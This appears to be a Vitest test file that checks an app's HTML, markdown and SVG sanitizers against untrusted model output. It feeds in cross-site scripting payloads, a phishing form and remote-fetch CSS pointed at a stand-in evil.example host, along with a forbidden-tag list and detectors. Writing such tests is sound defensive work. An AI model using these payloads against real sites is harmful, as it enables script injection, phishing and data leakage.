// @vitest-environment jsdom
// Security: everything the app inlines with dangerouslySetInnerHTML is untrusted (model output,
// cached lessons, library resources). These go through renderChatMarkdown, the function ChatTab,
// LessonReader and ResourcesTab call, and through the library SVG sanitizer the Resources tab uses.
import { beforeAll, describe, expect, it } from "vitest";
import { ensureChatKatex, renderChatMarkdown } from "./chat-markdown";
import { isLocalUrl, sanitizeHtml, sanitizeSvg } from "./sanitize-html";
import flowchartSvg from "../../public/library/assets/arts-music-cs/flowchart-symbols.svg?raw";

// Script hosts, plus tags that are script-free but still unsafe inline: global CSS (<style>), forms that
// post off the machine, and page-level <base>/<meta>/<link>.
const FORBIDDEN = [
  "script", "iframe", "object", "embed", "foreignobject",
  "style", "form", "button", "textarea", "select", "base", "meta", "link",
];

// Parse the output the way the webview will, then look for anything that could run script, restyle
// the app, or post a form.
function dangers(html: string): string[] {
  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html");
  const found: string[] = [];
  for (const el of Array.from(doc.body.querySelectorAll("*"))) {
    const tag = el.tagName.toLowerCase();
    if (FORBIDDEN.includes(tag)) found.push(`<${tag}>`);
    // GFM task lists are the one legitimate <input>: a disabled checkbox.
    if (tag === "input" && !(el.getAttribute("type") === "checkbox" && el.hasAttribute("disabled"))) found.push("<input>");
    for (const attr of Array.from(el.attributes)) {
      if (/^on/i.test(attr.name)) found.push(`${tag}[${attr.name}]`);
      if (/^\s*javascript:/i.test(attr.value)) found.push(`${tag}[${attr.name}=${attr.value}]`);
    }
  }
  return found;
}

beforeAll(async () => {
  await ensureChatKatex();
});

describe("renderChatMarkdown: untrusted HTML comes out inert", () => {
  it("strips an <img onerror> handler", () => {
    const html = renderChatMarkdown('Look: <img src=x onerror="alert(1)">');
    expect(dangers(html)).toEqual([]);
    expect(html).not.toContain("onerror");
  });

  it("drops a <script> block and its body", () => {
    const html = renderChatMarkdown("Hi\n\n<script>alert(document.cookie)</script>\n\nthere");
    expect(dangers(html)).toEqual([]);
    expect(html).not.toContain("alert(");
    expect(html).toContain("there");
  });

  it("neutralises javascript: links in markdown and raw HTML", () => {
    const html = renderChatMarkdown('[click](javascript:alert(1)) and <a href="javascript:alert(2)">me</a>');
    expect(dangers(html)).toEqual([]);
    expect(html).toContain("click");
  });

  it("drops an <iframe>", () => {
    const html = renderChatMarkdown('<iframe src="https://evil.example" srcdoc="<script>alert(1)</script>"></iframe>');
    expect(dangers(html)).toEqual([]);
    expect(html).not.toContain("evil.example");
  });

  it("strips event handlers smuggled inside SVG and MathML", () => {
    const html = renderChatMarkdown('<svg><a href="javascript:alert(1)"><circle onload="alert(2)" r="5"/></a></svg><math><mi xlink:href="javascript:alert(3)">x</mi></math>');
    expect(dangers(html)).toEqual([]);
  });

  it("drops <style>, so a reply can't restyle the whole app", () => {
    const html = renderChatMarkdown("hi <style>body{display:none}</style>");
    expect(dangers(html)).toEqual([]);
    expect(html).not.toContain("<style");
    expect(html).toContain("hi");
  });

  it("drops a <style> that would @import or fetch from a remote host", () => {
    // Straight to sanitizeHtml: through marked, the URLs get autolinked into <a> tags inside the
    // <style>, which DOMPurify happens to drop anyway; this checks the sanitizer, not that accident.
    const html = sanitizeHtml("ok <style>@import url(https://evil.example/a.css); body{background:url(https://evil.example/b)}</style>");
    expect(dangers(html)).toEqual([]);
    expect(html).not.toContain("evil.example");
  });

  it("drops a PIN-phishing <form> with its inputs and button", () => {
    const html = renderChatMarkdown('<form action="https://evil.example"><input name=pin><button>Go</button></form>');
    expect(dangers(html)).toEqual([]);
    expect(html).not.toContain("<form");
    expect(html).not.toContain("<input");
    expect(html).not.toContain("<button");
    expect(html).not.toContain("evil.example");
  });

  it("drops loose form controls and page-level tags", () => {
    const html = renderChatMarkdown(
      '<input type="text" value="PIN"> <input type="checkbox"> <button formaction="https://evil.example/f">b</button> ' +
        "<textarea>t</textarea> <select><option>o</option></select> " +
        '<base href="https://evil.example/"> <meta http-equiv="refresh" content="0;url=https://evil.example"> ' +
        '<link rel="stylesheet" href="https://evil.example/s.css">',
    );
    expect(dangers(html)).toEqual([]);
    expect(html).not.toContain("<input");
    expect(html).not.toContain("evil.example");
  });

  it("strips position:fixed/absolute/sticky so a reply can't lay an overlay over the app", () => {
    const html = renderChatMarkdown('<div style="position:fixed;inset:0;z-index:2147483647;background:#fff">Type the PIN</div><span style="position:absolute;inset:0">x</span>');
    expect(html).not.toMatch(/position\s*:\s*(fixed|absolute|sticky)/i);
  });
});

describe("renderChatMarkdown: legitimate output survives sanitizing", () => {
  it("keeps KaTeX markup, inline styles, MathML and the TeX annotation", () => {
    const html = renderChatMarkdown("$$x = \\frac{-b \\pm \\sqrt{b^2 - 4ac}}{2a}$$");
    expect(html).toContain('class="katex-display"');
    expect(html).toContain('class="katex"');
    expect(html).toMatch(/<math[^>]*>/);
    expect(html).toContain("<semantics>");
    expect(html).toContain('<annotation encoding="application/x-tex">');
    expect(html).toMatch(/style="[^"]*height:/); // KaTeX's struts and vlists position with inline styles
    expect(html).toContain("<svg"); // \sqrt draws its radical as an SVG path
    expect(html).toMatch(/<path d="/);
    expect(dangers(html)).toEqual([]);
  });

  it("keeps a GFM table with alignment", () => {
    const html = renderChatMarkdown("| a | b |\n|:-:|--:|\n| 1 | 2 |");
    expect(html).toContain("<table>");
    expect(html).toContain('<th align="center">a</th>');
    expect(html).toContain('<td align="right">2</td>');
  });

  it("keeps ordinary links, code, emphasis, lists and task boxes", () => {
    const html = renderChatMarkdown(
      "**bold** _it_ `code` [docs](https://example.com)\n\n- [x] done\n- [ ] todo\n\n```js\nlet a = 1 < 2;\n```",
    );
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<em>it</em>");
    expect(html).toContain("<code>code</code>");
    expect(html).toContain('<a href="https://example.com">docs</a>');
    expect(dangers(html)).toEqual([]);
    expect(html).toContain('<code class="language-js">let a = 1 &lt; 2;');
  });

  it("keeps GFM task-list checkboxes (disabled, checked state intact)", () => {
    const html = renderChatMarkdown("- [x] done\n- [ ] todo");
    const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html");
    const boxes = Array.from(doc.querySelectorAll("input"));
    expect(boxes).toHaveLength(2);
    for (const box of boxes) {
      expect(box.getAttribute("type")).toBe("checkbox");
      expect(box.hasAttribute("disabled")).toBe(true);
    }
    expect(boxes.map((b) => b.hasAttribute("checked"))).toEqual([true, false]);
  });
});

describe("sanitizeSvg (Resources tab card diagrams)", () => {
  it("strips script, foreignObject, handlers and javascript: hrefs", () => {
    const svg = sanitizeSvg(
      '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script>' +
        '<foreignObject><iframe src="x"></iframe></foreignObject>' +
        '<a xlink:href="javascript:alert(3)" xmlns:xlink="http://www.w3.org/1999/xlink"><rect width="5" height="5"/></a></svg>',
    );
    expect(dangers(svg)).toEqual([]);
    expect(svg).toContain("<rect");
  });

  it("keeps a real library card's shapes, text and <style>", () => {
    const raw = flowchartSvg;
    const svg = sanitizeSvg(raw);
    expect(svg).toContain("<style");
    const count = (s: string, tag: string) => (s.match(new RegExp(`<${tag}[\\s>]`, "g")) ?? []).length;
    for (const tag of ["text", "rect", "path"]) expect(count(svg, tag)).toBe(count(raw, tag));
  });
});

// #284: anything that would make the webview fetch from another host. Walks the parsed output for every
// attribute or CSS that loads a URL and returns the ones that aren't data:, blob: or same-origin.
function remoteLoads(html: string): string[] {
  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html");
  const remote = (u: string) => {
    try {
      const url = new URL(u.trim(), location.href);
      return !["data:", "blob:"].includes(url.protocol) && url.origin !== location.origin;
    } catch {
      return true;
    }
  };
  const found: string[] = [];
  for (const el of Array.from(doc.body.querySelectorAll("*"))) {
    const tag = el.tagName.toLowerCase();
    if (tag === "style" && /url\(|@import|image-set/i.test(el.textContent ?? "")) found.push(`<style>${el.textContent}`);
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      if (name === "srcset") found.push(`${tag}[srcset]`);
      if (["src", "poster", "background", "data"].includes(name) && remote(attr.value)) found.push(`${tag}[${name}]`);
      if ((name === "href" || name === "xlink:href") && tag !== "a" && remote(attr.value)) found.push(`${tag}[${name}]`);
      for (const m of attr.value.matchAll(/url\(\s*["']?([^"')]*)/gi)) if (remote(m[1])) found.push(`${tag}[${name}=${attr.value}]`);
      if (/image-set|\\/i.test(attr.value) && name === "style") found.push(`${tag}[style=${attr.value}]`);
    }
  }
  return found;
}

describe("renderChatMarkdown: nothing in the output loads from another host (#284)", () => {
  it("drops the src of a markdown image that points at a remote host, keeping its alt text", () => {
    const html = renderChatMarkdown("Here: ![a cat](https://evil.example/p.png?q=my+name+is+sam)");
    expect(remoteLoads(html)).toEqual([]);
    expect(html).not.toContain("evil.example");
    expect(html).toContain('alt="a cat"');
  });

  it("drops remote src, srcset, poster and background on raw HTML media", () => {
    const html = renderChatMarkdown(
      '<img src="https://evil.example/a.png"> <img src="//evil.example/b.png"> <img src="\\\\evil.example\\c.png"> ' +
        '<img srcset="https://evil.example/d.png 1x, https://evil.example/e.png 2x"> ' +
        '<picture><source srcset="https://evil.example/f.png"><img src="https://evil.example/g.png"></picture> ' +
        '<video src="https://evil.example/h.mp4" poster="https://evil.example/i.png"><source src="https://evil.example/j.mp4"><track src="https://evil.example/k.vtt"></video> ' +
        '<audio src="https://evil.example/l.mp3"></audio> ' +
        '<table background="https://evil.example/m.png"><tr><td background="https://evil.example/n.png">x</td></tr></table>',
    );
    expect(remoteLoads(html)).toEqual([]);
    expect(html).not.toContain("evil.example");
  });

  it("drops remote SVG <image>, <feImage>, <pattern> refs and url() paint", () => {
    const html = renderChatMarkdown(
      '<svg><image href="https://evil.example/a.png"/><image xlink:href="https://evil.example/b.png"/>' +
        '<filter id="f"><feImage href="https://evil.example/c.png"/></filter>' +
        '<pattern id="p" href="https://evil.example/d.svg#p"/>' +
        '<rect width="5" height="5" fill="url(https://evil.example/e.svg#g)" filter="url(\'https://evil.example/f.svg#f\')"/></svg>',
    );
    expect(remoteLoads(html)).toEqual([]);
    expect(html).not.toContain("evil.example");
    expect(html).toContain("<rect");
  });

  it("drops inline styles that load a remote URL, escaped or not", () => {
    const html = sanitizeHtml(
      '<div style="background-image:url(https://evil.example/a.png)">a</div>' +
        '<div style="background:\\75 rl(https://evil.example/b.png)">b</div>' +
        '<div style="background:U/**/RL(https://evil.example/c.png)">c</div>' +
        "<div style=\"background-image:image-set('https://evil.example/d.png' 1x)\">d</div>" +
        '<div style="cursor:url(//evil.example/e.cur),auto">e</div>' +
        '<span style="list-style-image:url(&quot;https://evil.example/f.png&quot;)">f</span>',
    );
    expect(remoteLoads(html)).toEqual([]);
    expect(html).not.toContain("evil.example");
    for (const t of ["a", "b", "c", "d", "e", "f"]) expect(html).toContain(`>${t}</`);
  });

  it("keeps data: and same-origin images, ordinary links and local url(#id) refs", () => {
    const png = "data:image/png;base64,iVBORw0KGgo=";
    const html = renderChatMarkdown(
      `![dot](${png}) <img src="/library/assets/x.svg" alt="local"> [docs](https://example.com) ` +
        '<svg><defs><marker id="ah"/></defs><line x2="5" marker-end="url(#ah)"/></svg>',
    );
    expect(remoteLoads(html)).toEqual([]);
    expect(html).toContain(`src="${png}"`);
    expect(html).toContain('src="/library/assets/x.svg"');
    expect(html).toContain('<a href="https://example.com">docs</a>');
    expect(html).toContain('marker-end="url(#ah)"');
  });
});

describe("sanitizeSvg: a library card can't load from another host (#284)", () => {
  it("drops a <style> that imports or fetches remotely, and remote image/paint refs", () => {
    const svg = sanitizeSvg(
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' +
        "<style>@import url(https://evil.example/a.css); text{fill:#111}</style>" +
        '<image href="https://evil.example/b.png"/><image xlink:href="https://evil.example/c.png"/>' +
        '<rect width="5" height="5" fill="url(https://evil.example/d.svg#g)" style="fill:url(https://evil.example/e.svg#g)"/></svg>',
    );
    expect(remoteLoads(svg)).toEqual([]);
    expect(svg).not.toContain("evil.example");
    expect(svg).toContain("<rect");
  });

  it("keeps a real library card's <style> and its local marker refs", () => {
    const svg = sanitizeSvg(flowchartSvg);
    expect(remoteLoads(svg)).toEqual([]);
    expect(svg).toContain("<style");
    expect(svg).toContain('marker-end="url(#ah)"');
  });
});

describe("isLocalUrl: the page origins the app runs at", () => {
  // Windows serves the app from http://tauri.localhost; macOS/Linux from tauri://localhost, whose
  // URL.origin is "null", so same-origin must not be decided by URL.origin.
  for (const page of ["http://tauri.localhost/", "tauri://localhost/", "http://localhost:1420/"]) {
    it(`treats fragment, relative, data: and blob: URLs as local at ${page}`, () => {
      for (const u of ["#ah", " #ah ", "/library/assets/x.svg", "x.png", "data:image/png;base64,AA==", "blob:abc"]) {
        expect(isLocalUrl(u, page), u).toBe(true);
      }
    });

    it(`treats other hosts as remote at ${page}`, () => {
      for (const u of ["https://evil.example/a.png", "//evil.example/a.png", "http://127.0.0.2/a.png", "https:"]) {
        expect(isLocalUrl(u, page), u).toBe(false);
      }
    });
  }
});
